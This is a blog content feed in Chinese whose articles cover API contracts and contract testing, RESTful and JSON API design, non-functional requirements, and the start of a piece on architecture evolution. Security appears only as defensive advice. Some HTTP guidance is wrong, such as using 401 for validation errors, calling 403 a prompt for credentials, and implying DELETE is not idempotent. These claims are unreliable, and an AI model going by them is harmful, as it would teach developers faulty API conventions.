开发之后，前端开发者再开始工作，在项目管理中这样产生时间线的依赖。理想的情况下，在需求明确后，架构师设计，前后端应该能各自独立工作，并在最后进行集成测试即可。</p><p>后端开发者可以根据文档实现接口，最后按照文档联合调试即可，甚至通过契约生成 API 调用和数据承载的 VO (Value Object)，减少工作量。如果 API 的提供者想做的更为完善一些，可以使用契约文件来验证实际 API 输出输出是否合理。</p><p><img src="/API设计/restful-api/api-design-document-and-contract/3427458920.png" alt="contract-model.png"></p><h3 id="契约测试"><a href="#契约测试" class="headerlink" title="契约测试"></a>契约测试</h3><p>当我们使用契约文件来提高前后端协作开发的体验，其中很重要的一部分就是契约测试，关于契约测试，我们一般指的是 Martin Fowler 提出的概念 —— “消费者驱动的契约”<br>简单来说，就是前后端开发者协定好后，由消费者驱动，通过编写 API 调用层相关的代码，可以直接生成契约文件。由于一个 API 可以被多处消费，所以消费者驱动可以更好的管理契约的变化（如果 API 验证契约时不能通过，说明契约被破坏了，可以在 CI 上马上反应出来）。</p><p><img src="/API设计/restful-api/api-design-document-and-contract/2560476446.png" alt="pact-model.png"></p><p>(Pact 契约测试模型)</p><p>写契约测试的博客非常多，就不展开赘述了。我把契约测试放到了前后端协作这个部分，是因为契约测试的前提是建立在前后端良好的协作下实现的。“契约测试”关注的是契约，而不是测试。</p><p>实际工作中，退一步说，制定好契约就可以完成基本的开发工作，对契约测试、验证可以让前后端协作变得更为可靠。如果你现在还没准备好使用契约测试的话，也不必焦虑，手动定义契约可以让前后端协作先运行起来。</p><p>而如果你恰好使用了 Spring boot 全家桶的话，不妨看看 Spring cloud contract。</p><h3 id="使用-Swagger-Yaml-契约"><a href="#使用-Swagger-Yaml-契约" class="headerlink" title="使用 Swagger Yaml 契约"></a>使用 Swagger Yaml 契约</h3><p>前面在讲 swagger 的时候，提到了Swagger Editor，使用这个工具可以通过编写 API 定义文件（Yaml格式），它提供线上版本，也可以本地使用。</p><p>后端通过生成 API 定义文件，就可以进一步完成生成 HTML 静态文档、模拟 API 数据等操作。<br>前端开发者可以通过 swagger 的 node 版本 swagger-node 自带的 mock 模式启动一个 Mock server，然后根据约定模拟自己想要的数据。 关于在前端使用的 mock server，实在太多，而且各有优劣，在附录中有一个清单以供参考，不再赘述。</p><h3 id="使用-RAML-契约"><a href="#使用-RAML-契约" class="headerlink" title="使用 RAML 契约"></a>使用 RAML 契约</h3><p>使用 Swagger Yaml 契约或者 Pact 契约都能在一定程度上完成契约测试、生成文档、mock 等工作，但是我们在实际工作中发现这些工具和平台的契约规则并不相同。</p><p>Swagger 在生成文档上非常优秀，然而在契约测试上不及 Pact，反之亦然。</p><p>随着引入微服务和开放的互联网项目越来越多，前后端协作的问题越来越明显，而解决上述问题的工具和技术并不通用。好在业界早已认识到这个问题，于是一些组织提出了 RestFul API 统一建模语言 （RESTful API Modeling Language），也就是 RAML。</p><p>围绕着 RAML 这一标准，构建出 API 协作的工具链，设计、构建、测试、文档、共享。</p><p><img src="/API设计/restful-api/api-design-document-and-contract/2964802501.png" alt="raml-model.png"></p><h2 id="其他前后端协作实践"><a href="#其他前后端协作实践" class="headerlink" title="其他前后端协作实践"></a>其他前后端协作实践</h2><h3 id="中心文档服务器"><a href="#中心文档服务器" class="headerlink" title="中心文档服务器"></a>中心文档服务器</h3><p>在一个大型的团队中，可能会有几十个以上的项目同时提供了 API，这种情况下如果每个应用都各自提供API文档就会变得很难管理，如果将 API 文档绑定到应用服务上会带来一些无意义的损耗。可以使用一个集中地服务来存放这些文档，类似于 github 的私有仓库，swagger 同样也提供了类似的服务 - swaggerhub.com。</p><p>即使不使用 swagger ，我们可以构建出 HTML 文档然后每一次输出部署到一台静态服务器，也是非常容易的事情。</p><p>如果是开源或者对外的 API，可以借用 GitHub Page 来创建我们的文档服务<br>针对团队内部，诸多云服务商均提供了静态服务器，例如 AWS 的 S3</p><h3 id="管理契约文件"><a href="#管理契约文件" class="headerlink" title="管理契约文件"></a>管理契约文件</h3><p>既然是契约文件，就不应该是API提供者或者消费者单独拥有的，即使只有一个调用方，至少是前端、后端共同拥有的。</p><p>那么契约文件应该怎么放呢？</p><p>我们之前一直放到API的代码仓库中，然后给所有的人添加了权限。后来发现这样做非常不方便，于是单独增加了一个管理契约文件的 git仓库，并使用 git 的submodule 来引用到各个涉及到了的代码仓库中。<br>将契约文件单独放置还有一个额外的好处，在构建契约测试时，可以方便的发送到一台中间服务器。一旦 API 契约发生变化，可以触发 API提供的契约验证测试。</p><h3 id="附录：API-文档工具清单"><a href="#附录：API-文档工具清单" class="headerlink" title="附录：API 文档工具清单"></a>附录：API 文档工具清单</h3><p>使用或调研过的，API 文档/契约生成工具</p><ul><li>apidoc</li><li>swagger</li><li>blue sprint</li><li>RAML</li></ul><p>使用或调研过得 mock 工具清单</p><ul><li>wiremock</li><li>json-server</li><li>node-mock-server</li><li>node-mocks-http</li></ul><p>HTTP 请求拦截器</p><ul><li>axios-mock-adapter</li><li>jquery-mockjax</li></ul><p>契约/API 测试工具</p><ul><li>Spring Cloud Contract</li><li>Pact</li><li>Rest-Assured</li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>重新认识RESTful</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/restful-api-introduction/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/restful-api-introduction/</url>
      
        <content type="html"><![CDATA[<p>如果你是一个客户端、前端开发者，你可能会在某个时间吐槽过后端工程师的API设计，原因可能是文档不完善、返回数据丢字段、错误码不清晰等。如果你是一个后端API开发者，你一定在某些时候感到困惑，怎么让接口URL设计的合理，数据格式怎么定，错误码怎么处理，然后怎么才能合适的描述我的API，API怎么认证用户的请求。</p><p>在前后端分离和微服务成为现代软件开发的大趋势下，API设计也应该变得越来越规范和高效。本篇希望把API相关的概念最朴素的方式梳理，对API设计有一个更全面和细致的认识，构建出更规范、设计清晰和文档完善的API。<br>重新认识API</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/1141077042.png" alt="veen.png"></p><p>广义的API（Application Programming Interface）是指应用程序编程接口，包括在操作系统中的动态链接库文件例如dllso，或者基于TCP层的socket连接，用来提供预定义的方法和函数，调用者无需访问源码和理解内部原理便可实现相应功能。而当前通常指通过HTTP协议传输的web service技术。</p><p>API在概念上和语言无关，理论上具有网络操作能力的所有编程语言都可以提供API服务。Java、PHP、Node甚至C都可以实现web API，都是通过响应HTTP请求并构造HTTP包来完成的，但是内部实现原理不同。例如QQ邮箱就是通过使用了C构建CGI服务器实现的。</p><p>API在概念上和JSON和XML等媒体类型无关，JSON和XML只是一种传输或媒体格式，便于计算机解析和读取数据，因此都有一个共同特点就是具有几个基本数据类型，同时提供了嵌套和列表的数据表达方式。JSON因为更加轻量、容易解析、和JavaScript天生集成，因此成为现在主流传输格式。在特殊的场景下可以构造自己的传输格式，例如JSONP传输的实际上是一段JavaScript代码来实现跨域。</p><p>基于以上，API设计的目的是为了让程序可读，应当遵从简单、易用、无状态等特性，这也是为什么Restful风格流行的原因。</p><h2 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h2><p><img src="/API设计/restful-api/restful-api-introduction/1935211481.png" alt="expression.png"></p><p>REST（英文：Representational State Transfer，简称REST），RESTful是一种对基于HTTP的应用设计风格，只是提供了一组设计原则和约束条件，而不是一种标准。网络上有大量对RESTful风格的解读，简单来说Restful定义URI和HTTP状态码，让你的API设计变得更简洁、清晰和富有层次，对缓存等实现更有帮助。RESTful不是灵丹妙药，也不是银弹。</p><p>RESTful第一次被提出是在2000Roy Fielding的博士论文中，他也是HTTP协议标准制定者之一。从本质上理解RESTful，它其实是尽可能复用HTTP特性来规范软件设计，甚至提高传输效率。HTTP包处于网络应用层，因此HTTP包为平台无关的字符串表示，如果尽可能的使用HTTP的包特征而不是大量在body定义自己的规则，可以用更简洁、清晰、高效的方式实现同样的需求。</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/2274203718.png" alt="verbs.png"></p><p>用我几年前一个真实的例子，我们为了提供一个订单信息API，为了更方便传递信息全部使用了POST请求，使用了定义了method表明调用方法：</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/1734109118.png" alt="RPC.png"></p><p>返回定义了自己的状态：</p><p><img src="/API设计/restful-api/restful-api-introduction/664468672.png" alt="bad-eg-data.png"></p><p>大家现在来看例子会觉得设计上很糟糕，但是在当时大量的API是这样设计的。操作资源的动作全部在数据体里面重新定义了一遍，URL上不能体现出任何有价值的信息，为缓存机制带来麻烦。对前端来说，在组装请求的时候显得麻烦不说，另外返回到数据的时候需要检查HTTP的状态是不是200，还需要检查status字段。<br>那么使用RESTful的例子是什么样呢：</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/4274385110.png" alt="good-eg.png"></p><p>例子中使用路径参数构建URL和HTTP动词来区分我们需要对服务所做出的操作，而不是使用URL上的接口名称，例如 getProducts等；使用HTTP状态码，而不是在body中自定义一个状态码字段；URL需要有层次的设计，例如/catetory/{category_id}/products 便于获取path参数，在以后例如负载均衡和缓存的路由非常有好处。</p><p>RESTful的本质是基于HTTP协议对资源的增删改查操作做出定义。理解HTTP协议非常简单，HTTP是通过网络socket发送一段字符串，这个字符串由键值对组成的header部分和纯文本的body部分组成。Url、Cookie、Method都在header中。</p><p>几个典型的RESTful API场景：</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/2239183045.png" alt="verbs-description.png"></p><p>虽然HTTP协议定义了其他的Method，但是就普通场景来说，用好上面的几项已经足够了<br>RESTful的几个注意点：</p><ul><li>URL只是表达被操作的资源位置，因此不应该使用动词，且注意单复数区分</li><li>除了POST和DELETE之外，其他的操作需要冥等的，例如对数据多次更新应该返回同样的内容</li><li>设计风格没有对错之分，RESTful一种设计风格，与此对应的还有RPC甚至自定义的风格</li><li>RESTful和语言、传输格式无关</li><li>无状态，HTTP设计本来就是没有状态的，之所以看起来有状态因为我们浏览器使用了Cookies，每次请求都会把Session ID（可以看做身份标识）传递到headers中。关于RESTful风格下怎么做用户身份认证我们会在后面讲到。</li><li>RESTful没有定义body中内容传输的格式，有另外的规范来描述怎么设计body的数据结构，网络上有些文章对RESTful的范围理解有差异</li></ul><h2 id="JSON-API"><a href="#JSON-API" class="headerlink" title="JSON API"></a>JSON API</h2><p>因为RESTful风格仅仅规定了URL和HTTP Method的使用，并没有定义body中数据格式的。我们怎么定义请求或者返回对象的结构，以及该如何针对不同的情况返回不同的HTTP 状态码？<br>同样的，这个世界上已经有人注意到这个问题，有一份叫做JSON API开源规范文档描述了如何传递数据的格式，JSON API最早来源于Ember Data（Ember是一个JavaScript前端框架，在框架中定义了一个通用的数据格式，后来被广泛认可）。</p><p>JSON已经是最主流的网络传输格式，因此本文默认JSON作为传输格式来讨论后面的话题。JSONAPI尝试去提供一个非常通用的描述数据资源的格式，关于记录的创建、更新和删除，因此要求在前后端均容易实现，并包含了基本的关系类型。个人理解，它的设计非常接近数据库ORM输出的数据类型，和一些Nosql（例如MongoDB）的数据结构也很像，从而对前端开发者来说拥有操作数据库或数据集合的体验。另外一个使用这个规范的好处是，已经有大量的库和框架做了相关实现，例如，backbone-jsonapi ，json-patch。<br>没有必要把JSON API文档全部搬过来，这里重点介绍常用部分内容。</p><h3 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h3><p>JSON API数据格式已经被IANA机构接受了注册，因此必须使用application/vnd.api+json类型。客户端请求头中Content-Type应该为application/vnd.api+json，并且在Accept中也必须包含application/vnd.api+json。如果指定错误服务器应该返回415或406状态码。</p><h3 id="JSON文档结构"><a href="#JSON文档结构" class="headerlink" title="JSON文档结构"></a>JSON文档结构</h3><p>在顶级节点使用data、errors、meta，来描述数据、错误信息、元信息，注意data和errors应该互斥，不能再一个文档中同时存在，meta在项目实际上用的很少，只有特别情况才需要用到，比如返回服务器的一些信息。</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/1214365586.png" alt="hateos.png"></p><h3 id="data属性"><a href="#data属性" class="headerlink" title="data属性"></a>data属性</h3><p>一个典型的data的对象格式，我们的有效信息一般都放在attributes中。</p><p><img src="/API设计/restful-api/restful-api-introduction/3166781431.png" alt="json.png"></p><ul><li>id显而易见为唯一标识，可以为数字也可以为hash字符串，取决于后端实现</li><li>type 描述数据的类型，可以对应为数据模型的类名</li><li>attributes 代表资源的具体数据</li><li>relationships、links为可选属性，用来放置关联数据和资源地址等数据</li></ul><h3 id="errors属性"><a href="#errors属性" class="headerlink" title="errors属性"></a>errors属性</h3><p>这里的errors和data有一点不同，一般来说返回值中errors作为列表存在，因为针对每个资源可能出现多个错误信息。最典型的例子为，我们请求的对象中某些字段不符合验证要求，这里需要返回验证信息，但是HTTP状态码会使用一个通用的401，然后把具体的验证信息在errors给出来。</p><p><img src="/API设计/restful-api/restful-api-introduction/2155807231.png" alt="image"></p><p>在title字段中给出错误信息，如果我们在本地或者开发环境想打出更多的调试堆栈信息，我们可以增加一个detail字段让调试更加方便。需要注意的一点是，我们应该在生产环境屏蔽部分敏感信息，detail字段最好在生产环境不可见。</p><h3 id="常用的返回码"><a href="#常用的返回码" class="headerlink" title="常用的返回码"></a>常用的返回码</h3><p>返回码这部分是我开始设计API最感到迷惑的地方，如果你去查看HTTP协议文档，文档上有几十个状态码让你无从下手。实际上我们能在真实环境中用到的并不多，这里会介绍几个典型的场景。</p><h4 id="200-OK"><a href="#200-OK" class="headerlink" title="200 OK"></a>200 OK</h4><p>200 是一个最常用的状态码用来表示请求成功，例如GET请求到某一个资源，或者更新、删除某资源。 需要注意的是使用POST创建资源应该返回201表示数据被创建。</p><h4 id="201-Created"><a href="#201-Created" class="headerlink" title="201 Created"></a>201 Created</h4><p>如果客户端发起一个POST请求，在RESTful部分我们提到，POST为创建资源，如果服务器处理成功应该返回一个创建成功的标志，在HTTP协议中，201为新建成功的状态。文档规定，服务器必须在data中返回id和type。 下面是一个HTTP的返回例子：</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/518121472.png" alt="image"></p><p>在HTTP协议中，2XX的状态码都表示成功，还有202、204等用的较少，就不做过多介绍了，4XX返回客户端错误，会重点介绍。</p><h4 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h4><p>如果服务器在检查用户输入的时候，需要传入的参数不能满足条件，服务器可以给出401错误，标记客户端错误，需要客户端自查。</p><h4 id="415-Unsupported-Media-Type"><a href="#415-Unsupported-Media-Type" class="headerlink" title="415 Unsupported Media Type"></a>415 Unsupported Media Type</h4><p>当服务器媒体类型Content-Type和Accept指定错误的时候，应该返回415。</p><h4 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h4><p>当客户端访问未授权的资源时，服务器应该返回403要求用户授权信息。</p><h4 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h4><p>这个太常见了，当指定资源找不到时服务器应当返回404。</p><h4 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h4><p>当服务器发生任何内部错误时，应当返回500，并给出errors字段，必要的时候需要返回错误的code，便于查错。一般来说，500错误是为了区分4XX错误，包括任何服务器内部技术或者业务异常都应该返回500。</p><h2 id="HATEOAS"><a href="#HATEOAS" class="headerlink" title="HATEOAS"></a>HATEOAS</h2><p>这个时候有些了解过HATEOAS同学会觉得上面的links和HATEOAS思想很像，那么HATEOAS是个什么呢，为什么又有一个陌生的名词要学。 实际上HATEOAS算作被JSON API定义了的一部分，HATEOAS思想是既然Restful是利用HTTP协议来进行增删改查，那我们怎么在没有文档的情况下找到这些资源的地址呢，一种可行的办法就是在API的返回体里面加入导航信息，也就是links。这样就像HTML中的A标签实现了超文本文档一样，实现了超链接JSON文档。</p><p>超链接JSON文档是我造的一个词，它的真是名字是Hypermedia As The Engine Of Application State，中文叫做超媒体应用程序状态的引擎，网上很多讲它。但是它并不是一个很高大上的概念，在RESTful和JSONAPI部分我们都贯穿了HATEOAS思想。下面给出一个典型的例子进一步说明：<br>如果在某个系统中产品和订单是一对多的关系，那我们给产品的返回值可以定义为：</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/1214365586.png" alt="hateos.png"></p><p>从返回中我们能得到links中product的的资源地址，同时也能得到orders的地址，这样我们不需要客户端自己拼装地址，就能够得到请求orders的地址。如果我们严格按照HATEOAS开发，客户端只需要在配置文件中定义一个入口地址就能够完成所有操作，在资源地址发生变化的时候也能自动适配。<br>当然，在实际项目中要使用HATEOAS也要付出额外的工作量(包括开发和前后端联调)，HATEOAS只是一种思想，怎么在项目中使用也需要灵活应对了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>在文档中还定义了分页、过滤、包含等更多内容，请移步文档：</p><ul><li>英文版：<a href="http://jsonapi.org/format/" target="_blank" rel="noopener">http://jsonapi.org/format/</a></li><li>中文版：<a href="http://jsonapi.org.cn/format/" target="_blank" rel="noopener">http://jsonapi.org.cn/format/</a> （PS：中文版更新不及时，请以英文文档为准）</li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>需求的冰山，来聊聊非功能性需求</title>
      <link href="/thinking/thinking/no-feature-requirement/"/>
      <url>/thinking/thinking/no-feature-requirement/</url>
      
        <content type="html"><![CDATA[<p>工作这么几年来，见得最多的场景是QA小伙伴追着开发满办公室报bug，不过有时候开发却不乐意了，当时可没说要XXX，要做XXX。</p><p>好像QA小伙伴永远比开发多一点心眼，即使单元测试覆盖率达到80%，QA还是变着法都能找出问题。</p><p>这其中很大一部分原因都是因为“需求背后的需求”造成的，BA、QA小伙伴以为你考虑到了，或者默认开发需要考虑的。<br>比如CMS系统中一个新建文章的需求，不太可能写出需要防止表单二次提交的AC，然而如果没人提出来谁会知道呢？</p><p><img src="/thinking/thinking/no-feature-requirement/4146258397.png" alt=" 非功能需求.png"></p><p>最终QA或者线上的用户会通过报bug告诉我们。</p><p>我们把这些隐藏到功能需求背后或BA默认认为开发需要考虑的需求称为为非功能性需求，有时候又叫跨功能需求。</p><p>下面就来说说在工作中常见的非功能性需求和怎么应对。</p><h2 id="交互体验相关"><a href="#交互体验相关" class="headerlink" title="交互体验相关"></a>交互体验相关</h2><p><strong>Loading</strong> 加载状态是最容易被忽略的一个需求，尤其是现在富客户端开发的模式下，数据的获取都是异步加载的。如果忘了考虑这条需求，在在网络条件较好时会出现闪烁的情况，而在网络情况差的条件下又看起来会卡顿和没有响应。实现统一的Loading可以在前端的网络请求库中增加拦截器，不过需要注意使用计数器让多次网络请求中途的Loading图标不会间断，否则会有闪烁的问题。</p><p><strong>表单的二次提交</strong> 有一些QA会使用极端的测试方法，例如快速点击按钮多次，如果页面没有进行处理，会触发表单多次提交的问题。即使后端API增加限制则可能同时出现成功和失败的提示，会让用户感到更加迷惑。处理这个问题有几种途径：</p><ul><li>使用蒙层的Loading 就会自带阻塞用户的操作的效果。</li><li>点击后禁用表单事件或在程序中增加请求中的状态。</li><li>依赖后端配置一次性表单令牌（通常用来防CRSF）</li></ul><p><strong>输出格式化</strong> 需求中一般会告诉开发怎么展示数据，但是往往忘记如何格式化数据。例如我们想让数字使用千分位分隔或其他显示方式让数字阅读不那么困难；字符串溢出的处理截取方式；时间的格式化方法，有一些项目会使用“1小时前”，“一天前”或者具体日期等更为人性化的显示方式；图片的输出需要宽度进行缩放，如果是封面图需要非拉伸截取等。</p><p><strong>请求用户确认和提示</strong> 这两项专业BA一般都会考虑到，也会通知UX设计对应样式。不过这里面的细节还是值得讨论。</p><ul><li>如果在一系列操作的中途提示用户确认，需要明确用户点击取消后，应该回退到用户的哪一步操作状态。有很多的APP在用户编辑好数据后，点击提交然后系统提示是否继续，如果用户点击取消，页面上的数据会被清除。开发需要和BA确认好具体的交互以及提示文案。</li><li>成功和错误的提示除了文案之外，和BA需要确认的还有：是独立的提示页还是返回到来源页面？提示需要自动关闭还是等待页面刷新后关闭？用户可以主动点击关闭吗？</li></ul><p>交互体验这部分还有一个需求噩耗就是，保持统一！！！我想这个是交互体验上最为致命又不会写在需求中，但是QA往往能从中找到bug。</p><h2 id="安全相关"><a href="#安全相关" class="headerlink" title="安全相关"></a>安全相关</h2><p><strong>身份校验和权限</strong> URL上资源可以被枚举和请求的资源没有验证用户权限，这属于致命而低级的安全问题，当然BA会默认开发要去做这些。不过现实就是在一些遗留项目中这种例子太多了，例如通过修改URL上的资源ID甚至userID此类参数进而修改其他用户的数据。几年前，可以发现很多此类漏洞，甚至在我学生时期用某电信运营商的权限漏洞得手了不少付费游戏。如果系统设计了权限管理模块，在开启新功能时也应该和BA确认是否纳入权限管理。</p><p><strong>表单验证</strong> 用户输入的数据如何验证这部分也是经常在需求上忘记体现出来的地方，而且这部分QA特别容易给出Bug，数据验证充满了大量的条件边界。还有一个老生常谈的问题，表单验证应该服务器端还是前端做？ 这很显然，后端为了安全必做，前端为了体验选做。</p><p><strong>SQL注入和XSS攻击</strong> SQL注入这两年随着成熟的ORM框架普遍使用几乎没有了，但是XSS可以说还是有很多。处理SQL注入和XSS攻击的共同点是不要相信任何用户的输入、任何来源。在浏览器中用户输入不仅有表单还有URL，而往往URL输入参数很容易被数据校验忽略。</p><p><strong>文件上传</strong> 文件上传背后的需求有上传文件的类型、大小限制；需要和BA确认是否能批量上传，上传前是否需要预览；上传后如何命名，是否需要在上传过程中对图片或视频进行压缩。这里的安全需求是，不应该上传可执行文件；需要获取文件真实后类型信息而非后缀名。文件上传的一个陷阱就是使用了客户端来源的文件名作为文件存储的文件名，这是极为不可靠的，在上传后的文件系统中需要使用内建的唯一命名，并通过数据库来记录用户上传的文件名。</p><h2 id="性能相关"><a href="#性能相关" class="headerlink" title="性能相关"></a>性能相关</h2><p><strong>响应时间</strong> 说实话，没见过那张卡上有明确的指标那些功能需要在多久之内完成响应。但是如果不在分析业务需求的阶段提出来，响应时间过长肯定通不过QA测试。在需求分析阶段的响应时间包含了3个注意点：</p><ul><li>系统性能设计要求。对一般需求而言，技术上应该达到基本的性能指标，当然实现的方式不尽相同，例如优化SQL、优化静态资源等。</li><li>该功能是否适合同步操作。然而有一些部分的需求是根本不适合使用同步的操作，例如数据导入这类耗时很长的操作，服务器应该接受用户请求然后不断返回任务处理的状态，而不是让用户端等待完成。实现上可以使用一些消息系统，例如JMS等。</li><li>第三方系统集成。如果和第三方系统集成，需要和资源提供方沟通是否需要增加批量的数据操作，避免循环获取数据。例如json API标准中提供了include方法聚合多个资源到一次请求中。另外调用方可以注意使用一些非阻塞的网络请求方法，如RxJava或AsyncRestTemplate。</li></ul><p><strong>实时消息通知</strong> 我们在做一些类似站内信、系统消息的功能时，有时候BA、QA容易默认消息的状态和数量（小红点）应该实时的显示在页面上，并及时更新。但开发小伙伴可能认为web上的一些信息需要用户刷新后可见，这个很容易达成理解不一致。如果实时刷新作为需求确实需要的话，从技术上需要做一些调整才能实现，比如使用轮询、HTTP长连接、websock等方法才能实现，这会带来额外的工作量。</p><p><strong>游离数据管理</strong> 从事服务器开发的小伙伴可能有这种体会，有一些数据一旦创建了，用户或者管理员就没法找到或者跟踪了。比较明显的例子有两处：</p><ul><li>新建资源处，异步上传的图片或者其他资源。比如在用户操作新建文章页面，这个时候文章表可能还没有写入数据，但是需要允许用户上传一些封面或者其他图片。如果用户体完成了整个操作，图片会和文章关联，但是假如用户放弃了操作，图片就会变成游离状态无法继续管理，造成大量垃圾数据占用系统资源。</li><li>删除操作，没有删除一些关联数据。例如商品表和商品属性表关联，如果删除操作不是事务性的一起删除，就会造成数据空间浪费，且可能影响后续的统计功能。</li></ul><p>对于新建资源的图片上传，可以和BA沟通使用草稿的方式在用户进入创建页就完成数据插入操作，也可以设计一个图片空间来提醒用户使用已经上传的图片；对于删除操作，系统不复杂可以设计为数据库表标记删除，而不是真的删除，也可以设计回收站功能统一移动到备份表。</p><p><strong>分布式系统延迟</strong> 由于现在稍大的系统都是用了分布式或微服务设计，系统之间存在系统存在同步延迟，比如数据库主从同步，静态资源服务器同步等。在一些对文案要求比较严格的项目中一个隐藏的需求是，需要提醒当前的信息可能存在延迟，请稍后再试。或者前端增加定时刷新页面的或者资源的回退策略，在我经历的一个项目中，上传图片成功返回图片URL后，前端可能会延迟2s左右才能从正常打开图片，因此需要增加onload、onerror进行重试或后续操作。</p><h2 id="其他非功能性需求"><a href="#其他非功能性需求" class="headerlink" title="其他非功能性需求"></a>其他非功能性需求</h2><p><strong>兼容性</strong> 浏览器兼容性是前端开发中头疼的事情，从IE6到微信webview，无论技术发展到哪个时代都逃不掉。那么那些事情是需要和BA确认的呢？</p><ul><li>各种浏览器内核具体的型号，而不是讨论搜狗、360这类壳浏览器。如果是APP内部的webview，这就需要收集相关安卓或IOS的版本号。</li><li>是否允许一定程度上的降级策略？比如在老式的安卓手机中大量的CSS3特性不支持，可能会造成动画失效，是否我们可以不在老式的手机中要求过渡动画等。</li></ul><p><strong>升级策略</strong> 前端有兼容性问题，那么服务器端就没有了么？不幸的是如果APP不是同步发布的话，API的修改需要照顾老的客户端。即使是同步发布的APP很难强制用户升级。在服务器端开发的时候保持一定兼容性的同时，更重要的是需要和BA一起设计出合理的升级方案。我的经验是设计API时，需要在URI路径中预留版本号，例如V1/your-api/{id}。同时也需要增加契约测试来保证API的修改不会破坏原来的逻辑。</p><p><strong>本地化和国际化</strong> 在一些国际化的项目中，这一点尤为重要，不过有时候容易被忽略。多语言和时区问题需要在项目之初就和BA确认，统一增加国际化方案。而其他本地化则需要在每个功能上注意，例如日期、货币、单位、标点符号的输出方式。</p><p><strong>用户行为分析埋点</strong> 越来越多的项目开始使用用户的行为分析工具了，例如Google的Gtag和更加专业的dynatrace，使用这些工具会对系统造成一定的侵入性，需要对用户的操作进行埋点。如果项目有类似的需求，针对特定的功能很多用户行为分析的系统会提前定义一些标签，那么在开始一个新功能时需要确认用户行为分析的一些规则。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>写作本篇的目的是分享在工作中开发在做一张卡背后需要考虑多少注意事项。细节想的越多，让业务逻辑变得更完整，可以让开发工作变得更为顺畅。</p><p>在参加公司某次培训时，恰好也有很好的非功能性需求的课程，非常详细，以至于长达数页，但遗憾的是没有非常详细的解释和应对方法。因此决定根据自己在工作中遇到过的场景作为例子，给大家分享出来。</p><p>在敏捷团队中一个痛点是我们很少有一个大而全的需求文档，如果在开卡的时候有一些需求没有被想到或者没有在AC中体现出来，就需要反复找BA、UX反复确认。开发和BA沟通调整需求、交互的时候可能忘记知会QA或者UX，或者没有更新故事卡内容，就又会造成沟通的麻烦。</p><p>经验之谈，多提意见，谢谢！</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>从单体到微服务，这些年架构的演变</title>
      <link href="/thinking/thinking/roamap-of-system/"/>
      <url>/thinking/thinking/roamap-of-system/</url>
      
        <content type="html"><![CDATA[<p>这两年业界最流行的技术架构话题已经从前后端分离，变成了分布式、微服务、DDD了。微服务架构适合所有的公司吗，业务场景演变到了什么地步才需要考虑上微服务呢？毕竟选择技术架构之前应该考虑业务是否与之匹配，否则分布式、微服务这类繁重的架构设计对一些公司来说就变成了屠龙之技，反而成为一线开发团队的负担。</p><p>在我不长的职业生涯中，经历过小型创业公司、国企般的大型项目以及在ThoughtWorks见到的各种项目。架构就像一个杂货铺，微服务也只是工具箱，不能有了锤子满世界找钉子，有可能人家只是一颗螺丝钉在等待改锥。</p><p><img src="/thinking/thinking/roamap-of-system/1093392083.jpg" alt="cloud-computing-architecture-diagrams.jpg"></p><p>我想尝试让架构这个概念变得更为通俗，原谅我文中出现大量不恰当的比喻。为了描述常见互联网公司技术架构演变过程，这里设定了一个虚拟背景：</p><p>Neo是一名软件工程师，毕业后就留在这个城市加入了一家互联网创业公司，公司的业务是从事面向餐厅的食材配送服务，用户可以从APP或者微信提前订购食材，公司会在次日早晨送达。使用了Java + MySQL的技术栈，目前来说还只是使用了一台服务器，并且数据库和应用程序都还是部署在同一台服务器上。</p><p>因为用户增加和业务逐渐变得复杂，Neo的团队遇到的第一个问题就是需要对系统扩容，提高系统响应速度。扩容对于互联网公司来说一般就是“加机器”，那么第一步，怎么加机器呢？</p><h2 id="单数据库多应用服务架构"><a href="#单数据库多应用服务架构" class="headerlink" title="单数据库多应用服务架构"></a>单数据库多应用服务架构</h2><p>增加机器方案的时候，我第一时间想到的是软件园餐厅的工作模式了。</p><p>软件系统用户就像来餐厅吃饭的顾客，而服务器就像服务员，本来服务员既可以收费也可以售卖菜品，就像有时我们在同一台服务器上同时部署了应用代码和数据库。如果在服务员同时承担结账和售饭职责的模式上增加人手的话，效率不高且最终的账目很可能无法保持一致，因此餐厅一般会有多个服务员售饭，然后由专人负责结账。</p><p>回到我们的架构问题上来，如果我们需要多台服务器响应更多的用户，同时也要保证数据的一致性。根据数据库的范式理论，数据的冗余性越低数据的一致性就越高。因此我们的第一步方案可以剥离为多个应用服务器处理用户的请求，一台数据库服务器来集中处理数据的读写，这样就能够达到分摊服务器压力的同时也能保证数据的正确。</p><p>不过在应用服务器的入口，我们需要增加一个负载均衡服务器，来分配不同的用户请求到特定的应用服务器上。这有点类似于餐厅的排队机，对用户分流。负载均衡服务器可以是普通PC服务器上配置Nginx一类的软件，也可以是F5这类专用的硬件负载均衡设备。<br><img src="/thinking/thinking/roamap-of-system/1579162026.png" alt="image1.png"></p><p>Neo的团队花了半个月的时间重新部署了这些服务器，通过剥离数据库和增加应用服务器的方式提高了系统性能。</p><h2 id="读写分离的数据库架构"><a href="#读写分离的数据库架构" 